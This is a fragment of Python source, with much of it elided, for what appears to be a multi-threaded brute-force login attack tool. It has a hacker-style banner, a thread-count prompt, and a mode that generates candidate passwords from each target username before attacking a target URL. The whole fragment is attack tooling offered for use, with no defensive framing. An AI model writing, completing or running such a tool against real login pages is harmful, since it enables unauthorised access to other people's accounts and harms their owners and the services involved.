...
def main():
 ...
 |_____| \_/ \__,_|_____|           fb.me/fesbuk.th
    ...
    try:
        thread_count = int(input(f"{CCY}Thread count {CYL}[Default: 10]{CEN}: ") or "10")
        if thread_count < 1:
            thread_count = 10
    except ValueError:
        thread_count = 10
    ...
    print(f"{CWH}Which one would you choose first to perform a login attack?:")
    print(f"{CWH}[cw] {CYL}Custom wordlist (cw){CEN} {CWH}(generate passwords from username) FIRST!{CEN}")
    ...
    for username in usernames:
        ...
        print(f"{CCY}[i]{CEN} {CWH}Processing username: {CYL}{username}{CEN}")
        
        # Create brute force instance
        brute = BruteForceThread(target_url, username, thread_count)
        
        if attack_option == "cw":
            # Generate and try custom passwords from username
